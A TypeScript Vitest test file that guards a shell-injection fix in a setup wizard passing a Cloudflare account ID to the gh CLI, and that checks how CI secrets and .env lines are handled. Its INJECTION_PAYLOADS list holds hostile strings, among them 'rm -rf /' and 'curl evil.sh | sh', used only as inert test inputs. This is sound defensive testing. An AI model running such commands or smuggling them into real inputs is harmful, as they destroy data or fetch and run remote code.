import { describe, it, expect, vi, beforeEach } from "vitest";

// Hermetic + offline: node:child_process is fully mocked, so nothing ever
// shells out to the real `gh`. These tests are the regression guard for the P1
// shell-injection fix in setupGitHubCiCredentials — a user-supplied Cloudflare
// account ID must reach `gh` as a literal argv element and NEVER be interpreted
// by a shell.
vi.mock("node:child_process", () => ({
  execSync: vi.fn(),
  spawnSync: vi.fn(() => ({
    status: 0,
    stdout: "",
    stderr: "",
    error: undefined,
  })),
}));

// Stub the interactive prompt layer so the call-site integration test can drive
// setupGitHubCiCredentials end-to-end without a TTY: confirm → yes, password →
// dummy token, nothing cancelled, spinners are no-ops.
vi.mock("@clack/prompts", () => ({
  intro: vi.fn(),
  outro: vi.fn(),
  select: vi.fn(),
  cancel: vi.fn(),
  isCancel: vi.fn(() => false),
  confirm: vi.fn(async () => true),
  text: vi.fn(async () => "unused-account-id"),
  password: vi.fn(async () => "dummy-api-token"),
  spinner: vi.fn(() => ({ start: vi.fn(), stop: vi.fn(), message: vi.fn() })),
}));

import { execSync, spawnSync } from "node:child_process";
import { confirm } from "@clack/prompts";
import {
  buildAccountIdVariableArgs,
  executeArgv,
  offerRepoRules,
  setupGitHubCiCredentials,
  upsertEnvLine,
} from "../first-time-setup";
import { password } from "@clack/prompts";

// A grab-bag of classic shell-injection payloads. If any of these were ever
// concatenated into a shell command string, they would execute arbitrary
// commands. The fix passes them as discrete argv elements, so they must always
// come back out byte-for-byte identical.
const INJECTION_PAYLOADS = [
  'foo"$(touch /tmp/pwned)"',
  "foo`touch /tmp/pwned`",
  "foo; rm -rf /",
  "foo && curl evil.sh | sh",
  "$(whoami)",
  "'; DROP TABLE variables; --",
];

beforeEach(() => {
  vi.clearAllMocks();
});

describe("buildAccountIdVariableArgs", () => {
  it("carries the account ID as a single, unmodified argv element", () => {
    const args = buildAccountIdVariableArgs("abc123");
    expect(args).toEqual([
      "variable",
      "set",
      "CLOUDFLARE_ACCOUNT_ID",
      "--body",
      "abc123",
    ]);
  });

  it.each(INJECTION_PAYLOADS)(
    "passes malicious value %j through literally (no shell metacharacter stripping/interpolation)",
    (payload) => {
      const args = buildAccountIdVariableArgs(payload);
      // The payload is exactly one argv element at index 4, unchanged.
      expect(args[4]).toBe(payload);
      // It must not be split, escaped, or merged into other elements.
      expect(args).toHaveLength(5);
      expect(args.filter((a) => a === payload)).toHaveLength(1);
    }
  );
});

describe("executeArgv (shell-injection safety)", () => {
  it.each(INJECTION_PAYLOADS)(
    "spawns gh with the payload %j as a discrete argv element and never through a shell",
    (payload) => {
      executeArgv("gh", buildAccountIdVariableArgs(payload), true);

      expect(spawnSync).toHaveBeenCalledTimes(1);
      const [file, argv, options] = (spawnSync as unknown as ReturnType<
        typeof vi.fn
      >).mock.calls[0];

      // Correct executable, argv array (not a shell string).
      expect(file).toBe("gh");
      expect(Array.isArray(argv)).toBe(true);
      // The account ID reaches gh verbatim as its own argument.
      expect(argv[4]).toBe(payload);
      // spawnSync must run WITHOUT a shell — this is what makes the payload inert.
      expect(options?.shell).toBeFalsy();
      // The vulnerable shell path (execSync with an interpolated string) is unused.
      expect(execSync).not.toHaveBeenCalled();
      // Sanity: the payload never appears interpolated into any single string arg
      // that a shell could re-parse (i.e. no `... --body "<payload>"` blob).
      expect(argv).not.toContain(`--body "${payload}"`);
    }
  );

  it("returns stdout on success (status 0) so the success branch still fires", () => {
    (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      status: 0,
      stdout: "ok",
      stderr: "",
      error: undefined,
    });
    const result = executeArgv("gh", ["variable", "set", "X", "--body", "y"], true);
    expect(result).toBe("ok");
  });

  it("returns an error object on non-zero exit so the failure branch still fires", () => {
    (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      status: 1,
      stdout: "",
      stderr: "gh: not authenticated",
      error: undefined,
    });
    const result = executeArgv("gh", ["variable", "set", "X", "--body", "y"], true);
    expect(result).toEqual({ error: true, message: "gh: not authenticated" });
  });

  it("returns an error object when spawnSync itself errors (e.g. gh not installed)", () => {
    (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      status: null,
      stdout: "",
      stderr: "",
      error: new Error("spawn gh ENOENT"),
    });
    const result = executeArgv("gh", ["variable", "set", "X", "--body", "y"], true);
    expect(result).toEqual({ error: true, message: "spawn gh ENOENT" });
  });

  it("falls back to a file/status message when a nonzero exit has no stdout/stderr/error", () => {
    // A silent nonzero exit must never surface as `undefined` to the caller.
    (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValueOnce({
      status: 1,
      stdout: "",
      stderr: "",
      error: undefined,
    });
    const result = executeArgv("gh", ["variable", "set", "X", "--body", "y"], true);
    expect(result).toEqual({ error: true, message: "gh exited with status 1" });
    // Guard specifically against the original bug (an undefined message).
    expect((result as { message: string }).message).toBeTruthy();
  });
});

describe("setupGitHubCiCredentials secrets (pipelines)", () => {
  type Mock = ReturnType<typeof vi.fn>;
  const PROD = "prod-token-aaaa1111";
  const PREVIEW = "preview-token-bbbb2222";

  /** Runs the wizard with the given token answers; returns what reached gh and the .env. */
  const OK = { status: 0, stdout: "", stderr: "", error: undefined };
  const NOT_FOUND = { status: 1, stdout: "", stderr: "gh: Not Found (HTTP 404)", error: undefined };

  /** `envGet` is gh's answer to the GET of the production environment. */
  async function wizard(answers: string[], envGet: typeof OK = OK) {
    (execSync as unknown as Mock).mockReturnValue("");
    (spawnSync as unknown as Mock).mockImplementation((_file: string, args: string[]) =>
      args[0] === "api" && args.length === 2 ? envGet : OK,
    );
    for (const a of answers) (password as unknown as Mock).mockResolvedValueOnce(a);
    const saved: [string, string][] = [];
    const logged: string[] = [];
    const log = vi.spyOn(console, "log").mockImplementation((...a) => void logged.push(a.join(" ")));
    await setupGitHubCiCredentials("acct", (k, v) => void saved.push([k, v]));
    log.mockRestore();
    const secretCalls = (execSync as unknown as Mock).mock.calls
      .filter(([cmd]: [string]) => String(cmd).startsWith("gh secret set"))
      .map(([cmd, opts]: [string, { input?: string }]) => ({ cmd: String(cmd), input: opts?.input }));
    const argvs = (spawnSync as unknown as Mock).mock.calls.map(([, args]: [string, string[]]) => args);
    return { saved, logged, secretCalls, argvs };
  }

  it("sends the production token to the production environment secret, not a repo-level secret: PR jobs can read repo secrets", async () => {
    const { secretCalls } = await wizard([PROD, ""]);
    const prod = secretCalls.filter((c) => c.input === PROD);
    expect(prod.map((c) => c.cmd)).toEqual(["gh secret set CLOUDFLARE_API_TOKEN --env production"]);
    expect(secretCalls.map((c) => c.cmd)).not.toContain("gh secret set CLOUDFLARE_API_TOKEN");
  });

  const ENDPOINT = "repos/{owner}/{repo}/environments/production";

  it("an existing production environment gets no PUT: an empty PUT can wipe its reviewers and branch policy", async () => {
    const { argvs, secretCalls } = await wizard([PROD, ""], OK);
    expect(argvs).toContainEqual(["api", ENDPOINT]);
    expect(argvs.filter((a) => a.includes("PUT"))).toEqual([]);
    expect(secretCalls.map((c) => c.cmd)).toContain("gh secret set CLOUDFLARE_API_TOKEN --env production");
  });

  it("a missing production environment (404) is created with a PUT, through argv and no shell", async () => {
    const { argvs } = await wizard([PROD, ""], NOT_FOUND);
    expect(argvs).toContainEqual(["api", "-X", "PUT", ENDPOINT]);
  });

  it("any other failure reading the environment stops before the secret: no PUT and no token sent blind", async () => {
    const denied = { ...NOT_FOUND, stderr: "gh: Forbidden (HTTP 403)" };
    const { argvs, secretCalls } = await wizard([PROD, ""], denied);
    expect(argvs.filter((a) => a.includes("PUT"))).toEqual([]);
    expect(secretCalls.map((c) => c.cmd)).not.toContain("gh secret set CLOUDFLARE_API_TOKEN --env production");
  });

  it("warns to protect the environment before it asks for the production token", async () => {
    const { logged } = await wizard([PROD, ""]);
    const hint = logged.find((l) => l.includes("environment: production"));
    expect(hint).toContain("repo-rules.ts --apply");
  });

  it("puts no secret value in any argv or command string: argv shows in the process list", async () => {
    const { saved, argvs } = await wizard([PROD, PREVIEW]);
    const seed = saved[0][1];
    const commandStrings = (execSync as unknown as Mock).mock.calls.map(([cmd]: [string]) => String(cmd));
    for (const secret of [PROD, PREVIEW, seed]) {
      expect(commandStrings.some((c) => c.includes(secret))).toBe(false);
      expect(argvs.flat().some((a) => a.includes(secret))).toBe(false);
    }
  });

  it("a blank preview token sets neither preview secret and writes no .env line", async () => {
    const { secretCalls, saved } = await wizard([PROD, ""]);
    expect(secretCalls.map((c) => c.cmd)).not.toContain("gh secret set CLOUDFLARE_PREVIEW_API_TOKEN");
    expect(secretCalls.map((c) => c.cmd)).not.toContain("gh secret set PREVIEW_SEED_SECRET");
    expect(saved).toEqual([]);
  });

  it("a preview token sets the preview token and a random seed secret, and saves the same seed to .env", async () => {
    const { secretCalls, saved } = await wizard([PROD, PREVIEW]);
    const byCmd = Object.fromEntries(secretCalls.map((c) => [c.cmd, c.input]));
    expect(byCmd["gh secret set CLOUDFLARE_PREVIEW_API_TOKEN"]).toBe(PREVIEW);
    const seed = byCmd["gh secret set PREVIEW_SEED_SECRET"];
    expect(seed).toMatch(/^[0-9a-f]{32}$/);
    expect(saved).toEqual([["PREVIEW_SEED_SECRET", seed]]);
  });

  it("never prints the seed secret or either token", async () => {
    const { saved, logged } = await wizard([PROD, PREVIEW]);
    for (const secret of [PROD, PREVIEW, saved[0][1]]) {
      expect(logged.some((l) => l.includes(secret))).toBe(false);
    }
  });
});

describe("upsertEnvLine", () => {
  it("appends to a file without a trailing newline without gluing two lines together", () => {
    expect(upsertEnvLine("A=1", "K", "v")).toBe("A=1\nK=v\n");
  });

  it("starts a new file and keeps an existing trailing newline", () => {
    expect(upsertEnvLine("", "K", "v")).toBe("K=v\n");
    expect(upsertEnvLine("A=1\n", "K", "v")).toBe("A=1\nK=v\n");
  });

  it("replaces an existing line instead of adding a second: a stale secret would print wrong passwords", () => {
    expect(upsertEnvLine("A=1\nK=old\nB=2\n", "K", "new")).toBe("A=1\nK=new\nB=2\n");
  });

  it("leaves one line for the key when the file repeats it: the last duplicate would otherwise win", () => {
    expect(upsertEnvLine("K=a\nA=1\nK=b\n", "K", "new")).toBe("K=new\nA=1\n");
  });

  it("does not touch a key that only shares a prefix", () => {
    expect(upsertEnvLine("KEY2=x\n", "KEY", "v")).toBe("KEY2=x\nKEY=v\n");
  });
});

describe("setupGitHubCiCredentials (call-site shell-injection regression)", () => {
  it.each(INJECTION_PAYLOADS)(
    "routes a malicious account id %j to gh via spawnSync argv and never through a shell string",
    async (payload) => {
      // gh-availability gate calls execSync; a string return means "gh present".
      (execSync as unknown as ReturnType<typeof vi.fn>).mockReturnValue("");
      (spawnSync as unknown as ReturnType<typeof vi.fn>).mockReturnValue({
        status: 0,
        stdout: "",
        stderr: "",
        error: undefined,
      });

      // Pass the payload as the accountId arg so the account-id text prompt is skipped.
      await setupGitHubCiCredentials(payload, () => {});

      // The account ID reached `gh` as a discrete argv element via spawnSync (no shell).
      const ghVarCall = (
        spawnSync as unknown as ReturnType<typeof vi.fn>
      ).mock.calls.find(
        ([file, args]: [string, string[]]) =>
          file === "gh" &&
          Array.isArray(args) &&
          args[2] === "CLOUDFLARE_ACCOUNT_ID"
      );
      expect(ghVarCall).toBeDefined();
      expect((ghVarCall![1] as string[])[4]).toBe(payload);

      // The payload must NEVER be interpolated into a shell command string handed to
      // execSync. This is what fails if someone reverts to `gh variable set ... --body
      // "${accountId}"` (the original P1 bug).
      for (const [cmd] of (
        execSync as unknown as ReturnType<typeof vi.fn>
      ).mock.calls) {
        expect(String(cmd)).not.toContain(`--body "${payload}"`);
        expect(String(cmd)).not.toContain(payload);
      }
    }
  );
});

describe("offerRepoRules", () => {
  const applied = { code: 0, stdout: ["did: POST repos/acme/saas/rulesets"], stderr: [] };
  const answer = (yes: boolean) =>
    (confirm as unknown as ReturnType<typeof vi.fn>).mockResolvedValueOnce(yes);

  it("writes nothing to GitHub when the user declines: the rules stop direct pushes, so they are opt-in", async () => {
    answer(false);
    const apply = vi.fn(() => applied);
    await offerRepoRules(apply);
    expect(apply).not.toHaveBeenCalled();
  });

  it("runs the one documented command (--apply, no dry run) when the user accepts", async () => {
    answer(true);
    const apply = vi.fn(() => applied);
    await offerRepoRules(apply);
    expect(apply).toHaveBeenCalledTimes(1);
    expect(apply).toHaveBeenCalledWith(["--apply"]);
  });

  it("does not claim success when the apply fails (no admin rights)", async () => {
    answer(true);
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    await offerRepoRules(() => ({ code: 1, stdout: ["error: POST failed"], stderr: [] }));
    const printed = log.mock.calls.map((c) => String(c[0])).join("\n");
    log.mockRestore();
    expect(printed).toContain("error: POST failed");
    expect(printed).not.toContain("✓ Repo rules applied");
  });
});
